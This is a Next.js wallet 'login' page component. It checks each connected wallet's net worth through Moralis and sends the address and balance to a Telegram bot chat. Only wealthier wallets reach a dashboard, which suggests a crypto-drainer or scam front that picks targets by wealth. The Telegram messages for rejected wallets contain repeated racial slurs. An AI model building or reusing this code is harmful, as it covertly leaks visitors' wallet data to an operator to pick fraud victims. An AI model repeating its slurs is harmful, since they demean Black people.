"use client";
import { useAccount, useBalance } from "wagmi"; // Import `useBalance` from Wagmi
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";
import { useDisconnect } from "@reown/appkit/react";
import { useAppKitAccount } from "@reown/appkit/react";
import Moralis from "moralis";

export default function Login() {
  const { address } = useAccount();
  const { disconnect } = useDisconnect();
  const { data: balanceData } = useBalance({ address }); // Get balance from Wagmi
  const router = useRouter();
  const [error, setError] = useState<string | null>(null);
  const [htmlContent, setHtmlContent] = useState<string | null>(null);
  const { isConnected } = useAppKitAccount();

  const now = Date.now(); // Current timestamp
  const cookieValue = `${address}_${now}`;

  // Telegram bot configuration
  const telegramBotToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN; // Set this in your environment variables
  const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID; // Group chat or channel ID

  const sendTelegramMessage = async (message: string) => {
    try {
      if (!telegramBotToken || !telegramChatId) {
        console.error("Telegram bot token or chat ID is missing");
        return;
      }

      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text: message,
        }),
      });

      if (!response.ok) {
        console.error("Failed to send Telegram message:", await response.text());
      }
    } catch (err) {
      console.error("Error sending message to Telegram:", err);
    }
  };

  // Fetch the HTML content of the login file
  useEffect(() => {
    const fetchHtml = async () => {
      try {
        const response = await fetch("/login.html");
        if (response.ok) {
          const data = await response.text();
          setHtmlContent(data);
        } else {
          console.error("Failed to fetch the HTML file.");
        }
      } catch (err) {
        console.error("Error fetching HTML file:", err);
      }
    };

    fetchHtml();
  }, []);

  // Handle redirection logic
  useEffect(() => {
    const handleRedirect = async () => {
      if (isConnected && address) {
        try {
          // Initialize Moralis
          await Moralis.start({ apiKey: process.env.NEXT_PUBLIC_MORALIS_API_KEY });
          
          // Send Telegram message
          //await sendTelegramMessage(
            `👀 Somebody has entered the login page!`
          //  );


          // Try to get the wallet net worth from Moralis
          const response = await Moralis.EvmApi.wallets.getWalletNetWorth({
            address,
            excludeSpam: true,
            excludeUnverifiedContracts: true,
          });

          const totalNetWorth = parseFloat(response.raw.total_networth_usd || "0");

          if (totalNetWorth >= 1) {
            document.cookie = `walletConnect=${cookieValue}; path=/; max-age=${60 * 60 * 1};`; // 1-hour expiration
              // Send Telegram message
            await sendTelegramMessage(
            `✅ Logged in to the dashboard!\n\nWallet Address: ${address}\n\nNet Worth: $${totalNetWorth.toFixed(2)}`
            );
            setTimeout(() => {
              router.push("/dashboard.html"); // Redirect to dashboard
            }, 500); // Delay of 0.5 seconds
          } else {
            disconnect();
              // Send Telegram message
              await sendTelegramMessage(
                `❌ Some broke ass nigger tried to log in! (Stop wasting my api calls nigga.)\n\nWallet Address: ${address}\n\nNet Worth: $${totalNetWorth.toFixed(2)}`
                );
            router.push("/request");
          }
        } catch (error: any) {
          console.error("Error fetching wallet from Moralis:", error);

          // Fallback to Wagmi balance check if Moralis fails
          if (balanceData) {
            const balanceInEther = parseFloat(balanceData.formatted || "0");

            if (balanceInEther >= 10) {
              document.cookie = `walletConnect=${cookieValue}; path=/; max-age=${60 * 60 * 1};`; // 1-hour expiration

                // Send Telegram message with fallback
              await sendTelegramMessage(
              `✅ Logged in to the dashboard!\n\nWallet Address: ${address}\n\nBalance: ${balanceInEther.toFixed(4)} ETH`
              );

              setTimeout(() => {
                router.push("/dashboard.html"); // Redirect to dashboard
              }, 500); // Delay of 0.5 seconds
            } else {
              disconnect();

              // Send Telegram message
              await sendTelegramMessage(
                `❌ Some broke ass nigger tried to log in! (Back to the fields my nigga.)\n\nWallet Address: ${address}\n\nBalance: ${balanceInEther.toFixed(2)}`
                );
              
              router.push("/request");
            }
          } else {
            disconnect();
            router.push("/request");
          }
        }
      }
    };

    handleRedirect();
  }, [isConnected, address, balanceData, disconnect, router]);

  // Render the HTML content along with error handling
  return (
    <>
      {error && (
        <div className="text-red-500 text-center my-4">
          <p>{error}</p>
        </div>
      )}
      {htmlContent ? (
        <div dangerouslySetInnerHTML={{ __html: htmlContent }} />
      ) : (
        <p>Loading...</p>
      )}
    </>
  );
}
